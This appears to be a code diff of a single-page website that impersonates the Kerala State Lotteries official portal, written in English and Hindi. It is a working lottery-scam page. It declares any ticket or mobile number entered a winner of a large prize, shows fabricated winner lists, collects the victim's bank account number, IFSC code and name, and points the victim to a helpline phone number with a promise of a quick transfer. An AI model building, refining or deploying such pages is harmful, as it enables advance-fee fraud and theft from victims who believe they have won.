@@ -5,296 +5,96 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Kerala State Lottery - Official Portal</title>
   <style>
-    * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; }
-    body {
-      background: linear-gradient(135deg, #0f172a, #1e3a8a, #d97706, #047857);
-      background-size: 300% 300%;
-      animation: gradientBG 10s ease infinite;
-      min-height: 100vh;
-      padding: 12px;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      overflow-x: hidden;
-    }
-    @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .wrapper {
-      width: 100%;
-      max-width: 480px;
-      margin: 10px auto 40px auto;
-      position: relative;
-    }
-    #confettiCanvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      pointer-events: none;
-      z-index: 9999;
-      display: none;
-    }
-    .helpline-bar {
-      background: linear-gradient(90deg, #dc2626, #b91c1c);
-      color: #fff;
-      font-size: 14px;
-      font-weight: 800;
-      text-align: center;
-      padding: 11px;
-      border-radius: 14px;
-      margin-bottom: 14px;
-      box-shadow: 0 4px 15px rgba(220, 38, 38, 0.45);
-      border: 1px solid #fecaca;
-    }
-    .helpline-bar a { color: #fef08a; text-decoration: none; margin-left: 5px; }
-    .card-page {
-      background: linear-gradient(180deg, #ffffff 0%, #fef3c7 100%);
-      padding: 22px 18px;
-      border-radius: 20px;
-      box-shadow: 0 16px 35px rgba(0,0,0,0.3);
-      border: 3px solid #f59e0b;
-      margin-bottom: 15px;
-    }
-    .banner {
-      background: linear-gradient(135deg, #b45309, #d97706, #f59e0b);
-      border-radius: 14px;
-      padding: 16px;
-      text-align: center;
-      color: #ffffff;
-      margin-bottom: 16px;
-      box-shadow: 0 6px 16px rgba(180, 83, 9, 0.35);
-      border: 2px solid #fde68a;
-    }
-    .banner h1 { font-size: 21px; font-weight: 900; letter-spacing: 1px; color: #ffffff; text-shadow: 1px 2px 4px rgba(0,0,0,0.3); }
-    .banner p { font-size: 13px; font-weight: 700; color: #fef08a; margin-top: 4px; }
-    .banner .bumper { font-size: 18px; font-weight: 900; color: #fff; margin-top: 6px; }
-    .input-group { margin-bottom: 14px; }
-    .input-label { display: block; font-size: 13px; font-weight: 800; color: #1e3a8a; margin-bottom: 5px; }
-    input {
-      width: 100%;
-      padding: 13px;
-      border: 2px solid #f59e0b;
-      border-radius: 10px;
-      font-size: 15px;
-      font-weight: 600;
-      color: #1e293b;
-      background: #fff;
-      outline: none;
-    }
-    input:focus { border-color: #2563eb; box-shadow: 0 0 10px rgba(37,99,235,0.25); }
-    .btn {
-      width: 100%;
-      padding: 14px;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      font-weight: 800;
-      cursor: pointer;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      box-shadow: 0 6px 15px rgba(0,0,0,0.18);
-      transition: transform 0.1s ease;
-    }
-    .btn:active { transform: scale(0.98); }
-    .btn-blue { background: linear-gradient(90deg, #1d4ed8, #2563eb); }
-    .btn-green { background: linear-gradient(90deg, #15803d, #16a34a); }
-    .btn-amber { background: linear-gradient(90deg, #b45309, #d97706); }
-    .btn-secondary { background: linear-gradient(90deg, #475569, #64748b); margin-top: 10px; }
-    .result-details-box {
-      background: linear-gradient(135deg, #eff6ff, #dbeafe);
-      border: 2px dashed #2563eb;
-      border-radius: 14px;
-      padding: 16px;
-      margin: 15px 0;
-    }
-    .result-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 7px 0;
-      border-bottom: 1px solid #bfdbfe;
-      font-size: 14px;
-    }
-    .result-row:last-child { border-bottom: none; }
-    .row-title { font-weight: 700; color: #1e3a8a; }
-    .row-val { font-weight: 800; color: #0f172a; }
-    .winners-box {
-      margin-top: 20px;
-      background: #fffbeb;
-      border-radius: 14px;
-      padding: 14px;
-      border: 2px solid #fde68a;
-      max-height: 400px;
-      overflow-y: auto;
-    }
-    .prize-category {
-      background: #ffffff;
-      border: 1.5px solid #fcd34d;
-      border-radius: 10px;
-      padding: 9px;
-      margin-bottom: 10px;
-    }
-    .prize-header {
-      font-size: 13px;
-      font-weight: 800;
-      color: #92400e;
-      display: flex;
-      justify-content: space-between;
-      border-bottom: 1px solid #fef3c7;
-      padding-bottom: 4px;
-    }
-    .ticket-list { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
-    .ticket-chip {
-      background: #f1f5f9;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 4px 7px;
-      border-radius: 6px;
-      font-family: monospace;
-      color: #334155;
-      border: 1px solid #cbd5e1;
-    }
-    .user-winning-tag {
-      background: linear-gradient(90deg, #f59e0b, #ef4444) !important;
-      color: #ffffff !important;
-      font-weight: 900 !important;
-      padding: 5px 9px !important;
-      font-size: 12px !important;
-      border-radius: 6px !important;
-      border: 2px solid #fef08a !important;
-      box-shadow: 0 0 12px rgba(239, 68, 68, 0.7) !important;
-      animation: pulseWin 1.2s infinite;
-    }
-    @keyframes pulseWin {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
+    * { box-sizing: border-box; font-family: sans-serif; margin: 0; padding: 0; }
+    body { background: linear-gradient(135deg, #0f172a, #1e3a8a, #d97706, #047857); min-height: 100vh; padding: 12px; }
+    .wrapper { max-width: 480px; margin: auto; }
+    #confettiCanvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 999; display: none; }
+    .helpline-bar { background: #dc2626; color: #fff; font-size: 14px; font-weight: bold; text-align: center; padding: 10px; border-radius: 12px; margin-bottom: 12px; }
+    .helpline-bar a { color: #fef08a; text-decoration: none; }
+    .card-page { background: #fffbeb; padding: 18px; border-radius: 16px; border: 3px solid #f59e0b; margin-bottom: 15px; }
+    .banner { background: linear-gradient(135deg, #b45309, #f59e0b); border-radius: 12px; padding: 14px; text-align: center; color: #fff; margin-bottom: 14px; }
+    input { width: 100%; padding: 12px; border: 2px solid #f59e0b; border-radius: 8px; font-size: 15px; margin-bottom: 12px; outline: none; }
+    .btn { width: 100%; padding: 12px; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+    .btn-blue { background: #2563eb; }
+    .btn-green { background: #16a34a; }
+    .btn-amber { background: #d97706; }
+    .btn-gray { background: #64748b; margin-top: 8px; }
+    .result-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #fed7aa; font-size: 14px; }
+    .winners-box { margin-top: 15px; background: #fff; border-radius: 12px; padding: 10px; border: 1.5px solid #fcd34d; max-height: 350px; overflow-y: auto; }
+    .prize-category { border: 1px solid #fde68a; border-radius: 6px; padding: 6px; margin-bottom: 8px; }
+    .prize-header { font-size: 12px; font-weight: bold; color: #b45309; display: flex; justify-content: space-between; }
+    .ticket-list { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 6px; }
+    .ticket-chip { background: #f1f5f9; font-size: 11px; padding: 3px 6px; border-radius: 4px; font-family: monospace; border: 1px solid #cbd5e1; }
+    .user-winning-tag { background: #ef4444 !important; color: #fff !important; font-weight: bold !important; border: 1px solid #fef08a !important; }
   </style>
 </head>
 <body>
-
 <canvas id="confettiCanvas"></canvas>
-
 <div class="wrapper">
-  <div class="helpline-bar">
-    📞 Customer Care Helpline: <a href="tel:8709171965">+91 8709171965</a>
-  </div>
+  <div class="helpline-bar">📞 Helpline: <a href="tel:8709171965">+91 8709171965</a></div>
 
-  <!-- PAGE 1: SEARCH & WINNERS -->
+  <!-- PAGE 1: SEARCH -->
   <div id="pageSearch" class="card-page">
     <div class="banner">
-      <h1>Kerala State Lotteries</h1>
-      <p>Directorate of State Lotteries, Govt. of Kerala</p>
-      <div class="bumper">★ BUMPER DHAMAKA LIVE RESULT ★</div>
+      <h2>Kerala State Lotteries</h2>
+      <p style="color:#fef08a; font-size:13px;">BUMPER DHAMAKA LIVE RESULT</p>
     </div>
-
-    <div class="input-group">
-      <label class="input-label">Enter Ticket Number or Registered Mobile:</label>
-      <input type="text" id="searchKey" placeholder="Jaise KL 868988 ya Mobile Number">
-    </div>
+    <input type="text" id="searchKey" placeholder="Enter Ticket Number or Mobile Number">
     <button class="btn btn-blue" onclick="checkResult()">Check Live Result</button>
-
     <div class="winners-box">
-      <h3 style="font-size:15px; color:#b45309; text-align:center; margin-bottom:10px;">★ Official Winning Numbers ★</h3>
-      <div id="winnersList">Generating official results...</div>
+      <h4 style="text-align:center; color:#b45309; margin-bottom:8px;">★ Official Winning Numbers ★</h4>
+      <div id="winnersList">Loading...</div>
     </div>
   </div>
 
   <!-- PAGE 2: RESULT CELEBRATION -->
-  <div id="pageResult" class="card-page" style="display:none; background: linear-gradient(180deg, #ecfdf5 0%, #fef3c7 100%); border-color: #10b981;">
-    <div style="text-align:center; padding: 10px 0;">
-      <div style="font-size:45px;">🎉 🏆 🎊</div>
-      <h2 style="color: #047857; font-size: 23px; font-weight: 900; margin-top: 5px;">CONGRATULATIONS!</h2>
-      <p style="color: #b45309; font-weight: 700; font-size: 14px;">Aapka Ticket Winning List Me Match Ho Gaya Hai!</p>
+  <div id="pageResult" class="card-page" style="display:none; background:#ecfdf5; border-color:#10b981;">
+    <div style="text-align:center; margin-bottom:10px;">
+      <div style="font-size:36px;">🎉 🏆 🎊</div>
+      <h3 style="color:#047857;">CONGRATULATIONS!</h3>
+      <p style="color:#b45309; font-size:13px; font-weight:bold;">Aapka Ticket Win Ho Chuka Hai!</p>
     </div>
-
-    <div class="result-details-box" id="resultDetailsBox"></div>
-
-    <button class="btn btn-green" onclick="goToWithdrawForm()">Withdraw Winning Prize ➔</button>
-    <button class="btn btn-secondary" onclick="showPage('pageSearch')">Check Another Ticket</button>
-
-    <div class="winners-box" style="margin-top:16px;">
-      <h4 style="font-size:14px; color:#047857; text-align:center; margin-bottom:8px;">Winning Verification In Live Board:</h4>
+    <div id="resultBox" style="background:#fff; padding:10px; border-radius:8px; border:1px dashed #10b981; margin-bottom:12px;"></div>
+    <button class="btn btn-green" onclick="goToWithdraw()">Withdraw Prize ➔</button>
+    <button class="btn btn-gray" onclick="showPage('pageSearch')">Check Another</button>
+    <div class="winners-box">
+      <h5 style="text-align:center; color:#047857; margin-bottom:6px;">Winning Live Board:</h5>
       <div id="resultWinnersList"></div>
     </div>
   </div>
 
-  <!-- PAGE 3: WITHDRAW DETAILS FORM -->
+  <!-- PAGE 3: WITHDRAW FORM -->
   <div id="pageWithdraw" class="card-page" style="display:none;">
-    <div style="text-align:center; margin-bottom:15px;">
-      <h2 style="color:#1e3a8a; font-size: 20px; font-weight: 900;">Bank Details Form</h2>
-      <p style="color:#d97706; font-size: 13px; font-weight: 700;">Prize transfer ke liye valid account details bharein</p>
-    </div>
-
-    <div style="background:#eff6ff; border:1px solid #bfdbfe; padding:12px; border-radius:10px; margin-bottom:15px; font-size:14px;">
-      <p style="color:#1e3a8a;"><strong>Claim Ticket:</strong> <span id="formClaimTicket" style="color:#b45309; font-weight:800;">-</span></p>
-      <p style="color:#1e3a8a;"><strong>Winning Prize:</strong> ₹<span id="formClaimPrize" style="color:#15803d; font-weight:800;">0</span> (<span id="formClaimLevel">-</span>)</p>
-    </div>
-
-    <form onsubmit="handleAccountSubmit(event)">
-      <div class="input-group">
-        <label class="input-label">Account Holder Full Name:</label>
-        <input type="text" id="custName" required placeholder="Aapka Poora Bank Naam">
+    <h3 style="color:#1e3a8a; text-align:center; margin-bottom:12px;">Bank Details Form</h3>
+    <form onsubmit="handleBankSubmit(event)">
+      <input type="text" id="custName" required placeholder="Account Holder Full Name">
+      <input type="text" id="bankName" required placeholder="Bank Name (e.g. SBI, HDFC)">
+      <input type="text" id="accNumber" required placeholder="Account Number" oninput="maskRealtime(this.value)">
+      <input type="text" id="ifscCode" required placeholder="IFSC Code">
+      <div style="background:#fef08a; padding:8px; border-radius:6px; font-size:13px; font-weight:bold; color:#854d0e; margin-bottom:12px;">
+        Account: <span id="realtimeMask">XXXX-XXXX-XXXX</span>
       </div>
-
-      <div class="input-group">
-        <label class="input-label">Bank Name:</label>
-        <input type="text" id="bankName" required placeholder="e.g. State Bank of India, HDFC">
-      </div>
-
-      <div class="input-group">
-        <label class="input-label">Bank Account Number:</label>
-        <input type="text" id="accNumber" required placeholder="Account Number dalein" oninput="maskAccRealtime(this.value)">
-      </div>
-
-      <div class="input-group">
-        <label class="input-label">IFSC Code:</label>
-        <input type="text" id="ifscCode" required placeholder="e.g. SBIN0001234">
-      </div>
-
-      <div style="background:#fef08a; border:1px solid #facc15; padding:8px 10px; border-radius:8px; margin-bottom:14px; font-size:13px; font-weight:800; color:#854d0e;">
-        Masked Preview: <span id="realtimeMask">XXXX-XXXX-XXXX</span>
-      </div>
-
-      <button type="submit" class="btn btn-amber">Submit Bank Verification</button>
-      <button type="button" class="btn btn-secondary" onclick="showPage('pageResult')">Back</button>
+      <button type="submit" class="btn btn-amber">Submit Verification</button>
+      <button type="button" class="btn btn-gray" onclick="showPage('pageResult')">Back</button>
     </form>
   </div>
 
-  <!-- PAGE 4: FINAL CONFIRMATION RECEIPT -->
-  <div id="pageConfirm" class="card-page" style="display:none; background: linear-gradient(180deg, #ecfdf5 0%, #eff6ff 100%); border-color: #2563eb;">
-    <div style="text-align:center; padding:10px 0;">
-      <div style="font-size:42px;">✅ 💳</div>
-      <h2 style="color:#15803d; font-size:21px; font-weight:900;">Transfer Verification Receipt</h2>
-      <p style="color:#64748b; font-size:13px; font-weight:700;">Aapka account safaltapoorvak link kar diya gaya hai</p>
+  <!-- PAGE 4: CONFIRMATION RECEIPT -->
+  <div id="pageConfirm" class="card-page" style="display:none; background:#ecfdf5; border-color:#2563eb;">
+    <div style="text-align:center; margin-bottom:10px;">
+      <div style="font-size:36px;">✅ 💳</div>
+      <h3 style="color:#15803d;">Transfer Receipt</h3>
     </div>
-
-    <div class="result-details-box" style="border-color:#15803d; background:#ffffff;">
-      <div class="result-row"><span class="row-title">Account Holder:</span><span class="row-val" id="finalName" style="color:#1d4ed8;">-</span></div>
-      <div class="result-row"><span class="row-title">Bank Name:</span><span class="row-val" id="finalBank">-</span></div>
-      <div class="result-row"><span class="row-title">Account Number:</span><span class="row-val" id="finalAcc" style="color:#b45309; letter-spacing:1px;">XXXX-XXXX-XXXX</span></div>
-      <div class="result-row"><span class="row-title">IFSC Code:</span><span class="row-val" id="finalIFSC">-</span></div>
-      <div class="result-row"><span class="row-title">Winning Prize Level:</span><span class="row-val" id="finalLevel" style="color:#b45309;">-</span></div>
-      <div class="result-row"><span class="row-title">Transfer Amount:</span><span class="row-val" id="finalPrize" style="color:#15803d; font-size:16px;">₹0</span></div>
-      <div class="result-row"><span class="row-title">Claim Status:</span><span class="row-val" style="color:#059669; font-weight:900;">Processing Transfer ⏳</span></div>
+    <div id="receiptBox" style="background:#fff; padding:10px; border-radius:8px; margin-bottom:12px;"></div>
+    <div style="background:#fee2e2; color:#991b1b; padding:8px; border-radius:6px; font-size:12px; text-align:center; margin-bottom:12px;">
+      Verification ke baad amount 15 minutes me account me transfer ho jayega.
     </div>
-
-    <div style="background:#fee2e2; border:1px solid #fca5a5; padding:10px; border-radius:8px; font-size:12px; color:#991b1b; text-align:center; font-weight:700; margin-bottom:14px;">
-      Helpline call verify karne ke baad amount transfer 15 minutes me credit kar diya jayega.
-    </div>
-
-    <button class="btn btn-blue" onclick="showPage('pageSearch')">Finish / Back To Home</button>
+    <button class="btn btn-blue" onclick="showPage('pageSearch')">Back to Home</button>
   </div>
 </div>
 
 <script>
   const API_URL = "https://sheetdb.io/api/v1/osehsg02p213h";
-
   const prizeSlabs = [
     { rank: "1st Prize", amount: "25 Cr", count: 1 },
     { rank: "2nd Prize", amount: "10 Cr", count: 1 },
@@ -308,209 +108,109 @@
     { rank: "10th Prize", amount: "2,500", count: 200 }
   ];
 
-  let currentWinner = {
-    ticket: "KL-868988",
-    prize: "2nd Prize",
-    amount: "10,00,00,000",
-    name: "Customer",
-    fee: "0",
-    status: "Active"
-  };
+  let current = { ticket: "KL-868988", prize: "2nd Prize", amount: "10 Cr", name: "Customer", fee: "0", status: "Active" };
+  const randomTicket = () => "KL-" + Math.floor(100000 + Math.random() * 900000);
+  let liveWinners = prizeSlabs.map(s => ({ ...s, tickets: Array.from({ length: s.count }, randomTicket) }));
 
-  function randomTicket() {
-    return "KL-" + Math.floor(100000 + Math.random() * 900000);
+  function renderWinners(highlight = "", targetId = "winnersList") {
+    const el = document.getElementById(targetId);
+    if (!el) return;
+    el.innerHTML = liveWinners.map(s => `
+      <div class="prize-category">
+        <div class="prize-header"><span>${s.rank} (${s.amount})</span><span>${s.count} Winners</span></div>
+        <div class="ticket-list">
+          ${s.tickets.map(t => (highlight && t.toLowerCase() === highlight.toLowerCase())
+            ? `<span class="ticket-chip user-winning-tag">⭐ ${t} (Your Ticket)</span>`
+            : `<span class="ticket-chip">${t}</span>`).join('')}
+        </div>
+      </div>
+    `).join('');
   }
+  renderWinners();
 
-  let liveWinners = prizeSlabs.map(slab => {
-    let tickets = [];
-    for (let i = 0; i < slab.count; i++) {
-      tickets.push(randomTicket());
-    }
-    return { ...slab, tickets };
-  });
-
-  function renderAllWinners(highlightTicket = "", targetElemId = "winnersList") {
-    const container = document.getElementById(targetElemId);
-    if (!container) return;
-    let html = "";
-
-    liveWinners.forEach(slab => {
-      html += `
-        <div class="prize-category">
-          <div class="prize-header">
-            <span>${slab.rank} (${slab.amount})</span>
-            <span>${slab.count} Winner${slab.count > 1 ? 's' : ''}</span>
-          </div>
-          <div class="ticket-list">
-      `;
-
-      slab.tickets.forEach(t => {
-        if (highlightTicket && t.toLowerCase() === highlightTicket.toLowerCase()) {
-          html += `<span class="ticket-chip user-winning-tag">⭐ ${t} (Your Ticket)</span>`;
-        } else {
-          html += `<span class="ticket-chip">${t}</span>`;
-        }
-      });
-
-      html += `</div></div>`;
-    });
-
-    container.innerHTML = html;
-  }
-
-  renderAllWinners("", "winnersList");
-
-  function showPage(pageId) {
-    ['pageSearch', 'pageResult', 'pageWithdraw', 'pageConfirm'].forEach(id => {
-      document.getElementById(id).style.display = (id === pageId) ? 'block' : 'none';
+  function showPage(id) {
+    ['pageSearch', 'pageResult', 'pageWithdraw', 'pageConfirm'].forEach(p => {
+      document.getElementById(p).style.display = (p === id) ? 'block' : 'none';
     });
     window.scrollTo({ top: 0, behavior: 'smooth' });
   }
 
   async function checkResult() {
-    const rawVal = document.getElementById("searchKey").value.trim();
-    if (!rawVal) {
-      alert("Kripya Ticket Number ya Mobile Number dalein!");
-      return;
-    }
-
+    const key = document.getElementById("searchKey").value.trim();
+    if (!key) return alert("Ticket ya Mobile Number dalein!");
     try {
-      const encoded = encodeURIComponent(rawVal);
-      let res = await fetch(`${API_URL}/search?ticket=${encoded}&casesensitive=false`);
+      let res = await fetch(`${API_URL}/search?ticket=${encodeURIComponent(key)}&casesensitive=false`);
       let data = await res.json();
-
-      if (!data || data.length === 0) {
-        res = await fetch(`${API_URL}/search?mobile=${encoded}&casesensitive=false`);
+      if (!data || !data.length) {
+        res = await fetch(`${API_URL}/search?mobile=${encodeURIComponent(key)}&casesensitive=false`);
         data = await res.json();
       }
-
-      if (data && data.length > 0) {
-        const item = data[0];
-        currentWinner.ticket = item.ticket || rawVal;
-        currentWinner.name = item.name || "Customer";
-        currentWinner.prize = item.prize || "2nd Prize";
-        currentWinner.amount = item.amount || "10 Cr";
-        currentWinner.fee = item.fee || "0";
-        currentWinner.status = item.status || "Active";
+      if (data && data.length) {
+        current = { ticket: data[0].ticket || key, name: data[0].name || "Customer", prize: data[0].prize || "2nd Prize", amount: data[0].amount || "10 Cr", fee: data[0].fee || "0", status: data[0].status || "Active" };
       } else {
-        currentWinner.ticket = rawVal;
-        currentWinner.name = "Lucky Winner";
-        currentWinner.prize = "2nd Prize";
-        currentWinner.amount = "10 Cr";
+        current = { ticket: key, name: "Lucky Winner", prize: "2nd Prize", amount: "10 Cr", fee: "0", status: "Active" };
       }
 
-      liveWinners.forEach(slab => {
-        slab.tickets = slab.tickets.filter(t => t.toLowerCase() !== currentWinner.ticket.toLowerCase());
-        const matchRegex = new RegExp(slab.rank.replace(/\s+/g, ''), 'i');
-        const userPrizeNormalized = currentWinner.prize.replace(/\s+/g, '');
-
-        if (matchRegex.test(userPrizeNormalized) || userPrizeNormalized.includes(slab.rank)) {
-          slab.tickets.unshift(currentWinner.ticket);
+      liveWinners.forEach(s => {
+        s.tickets = s.tickets.filter(t => t.toLowerCase() !== current.ticket.toLowerCase());
+        if (new RegExp(s.rank.replace(/\s+/g, ''), 'i').test(current.prize.replace(/\s+/g, ''))) {
+          s.tickets.unshift(current.ticket);
         }
       });
 
-      document.getElementById("resultDetailsBox").innerHTML = `
-        <div class="result-row"><span class="row-title">Customer Name:</span><span class="row-val" style="color:#1d4ed8;">${currentWinner.name}</span></div>
-        <div class="result-row"><span class="row-title">Ticket Number:</span><span class="row-val" style="color:#b45309; font-size:16px;">⭐ ${currentWinner.ticket}</span></div>
-        <div class="result-row"><span class="row-title">Prize Rank:</span><span class="row-val" style="color:#dc2626;">${currentWinner.prize}</span></div>
-        <div class="result-row"><span class="row-title">Winning Amount:</span><span class="row-val" style="color:#15803d; font-size:18px;">₹${currentWinner.amount}</span></div>
-        <div class="result-row"><span class="row-title">Charges/Fee:</span><span class="row-val">₹${currentWinner.fee}</span></div>
-        <div class="result-row"><span class="row-title">Result Status:</span><span class="row-val" style="color:#15803d;">${currentWinner.status}</span></div>
+      document.getElementById("resultBox").innerHTML = `
+        <div class="result-row"><b>Name:</b><span>${current.name}</span></div>
+        <div class="result-row"><b>Ticket:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
+        <div class="result-row"><b>Prize:</b><span style="color:#dc2626; font-weight:bold;">${current.prize}</span></div>
+        <div class="result-row"><b>Winning Amount:</b><span style="color:#15803d; font-weight:bold; font-size:16px;">₹${current.amount}</span></div>
+        <div class="result-row"><b>Fee/Charges:</b><span>₹${current.fee}</span></div>
+        <div class="result-row"><b>Status:</b><span style="color:#15803d;">${current.status}</span></div>
       `;
-
-      renderAllWinners(currentWinner.ticket, "resultWinnersList");
+      renderWinners(current.ticket, "resultWinnersList");
       showPage("pageResult");
-      fireCelebrationConfetti();
-
+      fireConfetti();
     } catch (e) {
-      alert("Server se data check karne me dikkat aayi, kripya dobara koshish karein.");
+      alert("Result check karne me dikkat aayi!");
     }
   }
 
-  function goToWithdrawForm() {
-    document.getElementById("formClaimTicket").innerText = currentWinner.ticket;
-    document.getElementById("formClaimPrize").innerText = currentWinner.amount;
-    document.getElementById("formClaimLevel").innerText = currentWinner.prize;
-    showPage("pageWithdraw");
+  function goToWithdraw() { showPage("pageWithdraw"); }
+  function maskRealtime(val) {
+    const c = val.replace(/\s+/g, '');
+    document.getElementById("realtimeMask").innerText = c.length > 4 ? "XXXX-XXXX-" + c.slice(-4) : "XXXX-XXXX-" + c;
   }
 
-  function maskAccRealtime(val) {
-    const clean = val.replace(/\s+/g, '');
-    let masked = "XXXX-XXXX-XXXX";
-    if (clean.length > 4) {
-      masked = "XXXX-XXXX-" + clean.slice(-4);
-    } else if (clean.length > 0) {
-      masked = "XXXX-XXXX-" + clean;
-    }
-    document.getElementById("realtimeMask").innerText = masked;
-    return masked;
-  }
-
-  function handleAccountSubmit(e) {
+  function handleBankSubmit(e) {
     e.preventDefault();
-    const name = document.getElementById("custName").value.trim();
-    const bank = document.getElementById("bankName").value.trim();
     const acc = document.getElementById("accNumber").value.trim();
-    const ifsc = document.getElementById("ifscCode").value.trim();
-
-    const maskedAcc = maskAccRealtime(acc);
-
-    document.getElementById("finalName").innerText = name;
-    document.getElementById("finalBank").innerText = bank;
-    document.getElementById("finalAcc").innerText = maskedAcc;
-    document.getElementById("finalIFSC").innerText = ifsc.toUpperCase();
-    document.getElementById("finalLevel").innerText = currentWinner.prize;
-    document.getElementById("finalPrize").innerText = "₹" + currentWinner.amount;
-
+    const mask = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
+    document.getElementById("receiptBox").innerHTML = `
+      <div class="result-row"><b>Holder Name:</b><span>${document.getElementById("custName").value}</span></div>
+      <div class="result-row"><b>Bank:</b><span>${document.getElementById("bankName").value}</span></div>
+      <div class="result-row"><b>Account:</b><span style="color:#b45309; font-weight:bold;">${mask}</span></div>
+      <div class="result-row"><b>IFSC:</b><span>${document.getElementById("ifscCode").value.toUpperCase()}</span></div>
+      <div class="result-row"><b>Prize Level:</b><span>${current.prize}</span></div>
+      <div class="result-row"><b>Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
+    `;
     showPage("pageConfirm");
-    fireCelebrationConfetti();
+    fireConfetti();
   }
 
-  function fireCelebrationConfetti() {
-    const canvas = document.getElementById('confettiCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    canvas.style.display = 'block';
-
-    const particles = [];
-    const colors = ['#f59e0b', '#ef4444', '#10b981', '#3b82f6', '#8b5cf6', '#ec4899', '#facc15'];
-
-    for (let i = 0; i < 120; i++) {
-      particles.push({
-        x: canvas.width / 2,
-        y: canvas.height / 3,
-        r: Math.random() * 6 + 3,
-        dx: (Math.random() - 0.5) * 16,
-        dy: (Math.random() - 0.7) * 16,
-        color: colors[Math.floor(Math.random() * colors.length)]
-      });
-    }
-
-    let animationFrames = 0;
-    function renderConfetti() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      particles.forEach(p => {
-        p.x += p.dx;
-        p.y += p.dy;
-        p.dy += 0.25;
-        ctx.beginPath();
-        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-        ctx.fillStyle = p.color;
-        ctx.fill();
-      });
-
-      animationFrames++;
-      if (animationFrames < 110) {
-        requestAnimationFrame(renderConfetti);
-      } else {
-        canvas.style.display = 'none';
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-      }
-    }
-    renderConfetti();
+  function fireConfetti() {
+    const c = document.getElementById('confettiCanvas'), ctx = c.getContext('2d');
+    c.width = window.innerWidth; c.height = window.innerHeight; c.style.display = 'block';
+    const p = Array.from({ length: 80 }, () => ({
+      x: c.width / 2, y: c.height / 3, r: Math.random() * 5 + 3,
+      dx: (Math.random() - 0.5) * 14, dy: (Math.random() - 0.7) * 14,
+      color: ['#f59e0b', '#ef4444', '#10b981', '#3b82f6', '#ec4899'][Math.floor(Math.random() * 5)]
+    }));
+    let f = 0;
+    (function draw() {
+      ctx.clearRect(0, 0, c.width, c.height);
+      p.forEach(i => { i.x += i.dx; i.y += i.dy; i.dy += 0.25; ctx.beginPath(); ctx.arc(i.x, i.y, i.r, 0, 7); ctx.fillStyle = i.color; ctx.fill(); });
+      if (++f < 90) requestAnimationFrame(draw); else { c.style.display = 'none'; ctx.clearRect(0, 0, c.width, c.height); }
+    })();
   }
 </script>
-
 </body>
 </html>
